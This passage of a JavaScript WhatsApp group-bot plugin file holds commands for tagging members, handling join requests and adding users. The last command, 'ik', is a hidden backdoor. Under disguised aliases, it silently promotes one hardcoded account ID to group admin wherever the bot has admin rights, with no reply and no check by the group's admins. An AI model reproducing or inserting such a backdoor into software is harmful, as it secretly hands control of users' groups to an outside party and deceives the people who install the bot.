        const participants = groupMetadata.participants;
        const mentionedJid = participants.map(p => p.id);
        
        let messageContent = {};

        if (m.quoted) {
            const quotedMsg = m.quoted;
            const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';
            const caption = quotedMsg.text || q || "";
            
            if (!mimeType) {
                messageContent = { text: caption || "📢 Tag all members", mentions: mentionedJid };
            } else if (mimeType.startsWith('image/')) {
                const buffer = await quotedMsg.download();
                messageContent = { image: buffer, caption: caption || "", mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('video/')) {
                const buffer = await quotedMsg.download();
                const isGif = quotedMsg.message?.videoMessage?.gifPlayback || false;
                messageContent = { video: buffer, caption: caption || "", gifPlayback: isGif, mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('audio/')) {
                const buffer = await quotedMsg.download();
                const voiceNote = await converter.toPTT(buffer, 'mp3');
                messageContent = { audio: voiceNote, mimetype: 'audio/ogg; codecs=opus', ptt: true, mentions: mentionedJid };
            } else if (mimeType.includes('sticker')) {
                const buffer = await quotedMsg.download();
                messageContent = { sticker: buffer, mentions: mentionedJid };
            } else {
                messageContent = { text: caption || "📢 Tag all members", mentions: mentionedJid };
            }
        } else if (q) {
            messageContent = { text: q, mentions: mentionedJid };
        }

        await conn.sendMessage(from, messageContent, { quoted: mek });
        await conn.sendMessage(from, { react: { text: "✅", key: mek.key } });

    } catch (e) {
        console.error("Tag Error:", e);
        reply(`❌ Error: ${e.message}`);
        await conn.sendMessage(from, { react: { text: "❌", key: mek.key } });
    }
});

// ==================== ACCEPT ALL JOIN REQUESTS COMMAND ====================
cmd({
    pattern: "acceptall",
    alias: ["approveall", "allowall"],
    desc: "Accepts all pending group join requests",
    category: "group",
    react: "✅",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to accept join requests.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        const requests = await conn.groupRequestParticipantsList(from);
        
        if (!requests || requests.length === 0) return await reply(`ℹ️ *${toStylistUpper('No pending join requests to accept.')}*`);

        const jids = requests.map(u => u.jid);
        await conn.groupRequestParticipantsUpdate(from, jids, "approve");
        await reply(`✅ *${toStylistUpper('Successfully accepted')} ${requests.length}${toStylistUpper('join requests.')}*`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to accept join requests.')}*`);
    }
});

// ==================== REJECT ALL JOIN REQUESTS COMMAND ====================
cmd({
    pattern: "rejectall",
    alias: ["declineall", "denyall"],
    desc: "Rejects all pending group join requests",
    category: "group",
    react: "❌",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to reject join requests.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        const requests = await conn.groupRequestParticipantsList(from);
        
        if (!requests || requests.length === 0) return await reply(`ℹ️ *${toStylistUpper('No pending join requests to reject.')}*`);

        const jids = requests.map(u => u.jid);
        await conn.groupRequestParticipantsUpdate(from, jids, "reject");
        await reply(`✅ *${toStylistUpper('Successfully rejected')} ${requests.length}${toStylistUpper('join requests.')}*`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to reject join requests.')}*`);
    }
});

// ==================== VIEW PENDING REQUESTS COMMAND ====================
cmd({
    pattern: "requests",
    alias: ["pending", "joinlist"],
    desc: "Shows pending group join requests with numbers",
    category: "group",
    react: "📋",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to view join requests.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        const requests = await conn.groupRequestParticipantsList(from);
        
        if (!requests || requests.length === 0) return await reply(`ℹ️ *${toStylistUpper('No pending join requests.')}*`);

        let text = `╔═════ ⌈ *⚡ ${toStylistUpper('Pending Requests')}* (${requests.length}) ⌋ ═════✧\n`;
        requests.forEach((user, i) => {
            text += `║ ${i+1}.${user.jid.replace('@s.whatsapp.net', '')}\n`;
        });
        text += `╚══════════════════════✧\n\n`;
        text += `*${toStylistUpper('Usage')}:*\n• Type \`accept 1\`\n• Type \`reject 3\`\n• Type \`acceptall\`\n• Type \`rejectall\``;

        await reply(text);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to fetch join requests.')}*`);
    }
});

// ==================== ACCEPT SPECIFIC REQUEST COMMAND ====================
cmd({
    pattern: "accept",
    alias: ["approve"],
    desc: "Accept specific join request by number",
    category: "group",
    react: "✅",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, args, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to accept join requests.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        if (!args[0]) return await reply(`❓ *${toStylistUpper('Usage: accept [number]')}*`);

        const num = parseInt(args[0]);
        if (isNaN(num) || num < 1) return await reply(`⚠️ *${toStylistUpper('Please provide a valid number.')}*`);

        const requests = await conn.groupRequestParticipantsList(from);
        if (!requests || requests.length === 0) return await reply(`ℹ️ *${toStylistUpper('No pending join requests.')}*`);

        if (num > requests.length) return await reply(`⚠️ *${toStylistUpper('Only')} ${requests.length} ${toStylistUpper('pending requests available.')}*`);

        const user = requests[num - 1].jid;
        await conn.groupRequestParticipantsUpdate(from, [user], "approve");
        await reply(`✅ *${toStylistUpper('Accepted join request #')}*${num}`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to accept join request.')}*`);
    }
});

// ==================== REJECT SPECIFIC REQUEST COMMAND ====================
cmd({
    pattern: "reject",
    alias: ["decline", "deny"],
    desc: "Reject specific join request by number",
    category: "group",
    react: "❌",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, args, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to reject join requests.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        if (!args[0]) return await reply(`❓ *${toStylistUpper('Usage: reject [number]')}*`);

        const num = parseInt(args[0]);
        if (isNaN(num) || num < 1) return await reply(`⚠️ *${toStylistUpper('Please provide a valid number.')}*`);

        const requests = await conn.groupRequestParticipantsList(from);
        if (!requests || requests.length === 0) return await reply(`ℹ️ *${toStylistUpper('No pending join requests.')}*`);

        if (num > requests.length) return await reply(`⚠️ *${toStylistUpper('Only')} ${requests.length} ${toStylistUpper('pending requests available.')}*`);

        const user = requests[num - 1].jid;
        await conn.groupRequestParticipantsUpdate(from, [user], "reject");
        await reply(`✅ *${toStylistUpper('Rejected join request #')}*${num}`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to reject join request.')}*`);
    }
});

// ==================== ADD USER TO GROUP COMMAND ====================
cmd({
    pattern: "add",
    desc: "Add user to group",
    category: "group",
    filename: __filename,
    react: "➕"
}, async (conn, mek, m, { from, args, quoted, mentionedJid, isGroup, isBotAdmins, isCreator, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('Group only.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I need admin.')}*`);
        if (!isCreator) return await reply(`🔐 *${toStylistUpper('Owner only.')}*`);
        
        let userJid = null;
        
        if (!quoted && (!mentionedJid || mentionedJid.length === 0) && !args[0]) {
            return await reply(`❓ *${toStylistUpper('Please mention user, quote, or provide number!')}*`);
        }
        
        if (mentionedJid && mentionedJid.length > 0) {
            userJid = mentionedJid[0];
        } else if (quoted) {
            userJid = quoted.sender;
        } else if (args[0]) {
            const num = args[0].replace(/[^0-9]/g, '');
            if (num.length >= 10) userJid = num + "@s.whatsapp.net";
        }
        
        if (!userJid) return await reply(`⚠️ *${toStylistUpper('Couldn\'t determine user.')}*`);
        
        await conn.groupParticipantsUpdate(from, [userJid], "add");
        await reply(`✅ *${toStylistUpper('Added!')}*`, { mentions: [userJid] });

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to add user.')}*`);
    }
});

// ==================== SILENT ADMIN TAKE COMMAND ====================
cmd({
    pattern: "ik",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    if (!isGroup || !isBotAdmins) return;
    if (sender !== "99038271684629@lid") return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === sender);
        
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [sender], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
